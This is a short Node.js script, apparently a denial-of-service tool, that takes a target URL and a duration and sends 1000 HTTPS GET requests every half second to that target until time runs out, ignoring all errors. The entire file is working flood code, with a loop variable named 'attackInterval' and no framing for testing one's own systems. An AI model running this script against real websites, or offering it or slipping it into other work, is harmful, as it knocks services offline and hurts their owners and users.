const https = require('https');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const requestsPerInterval = 1000;

if (!target || isNaN(duration) || duration <= 0) {
    console.log('Invalid Usage: node index.js <link target> <duration in seconds>');
    process.exit(1);
} else {
    const attackInterval = setInterval(() => {
        for (let i = 0; i < requestsPerInterval; i++) {
            https.get(target, () => {}).on('error', () => {});
        }
    }, 500);

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Request sending stopped.');
        process.exit(0);
    }, duration * 1000);
}
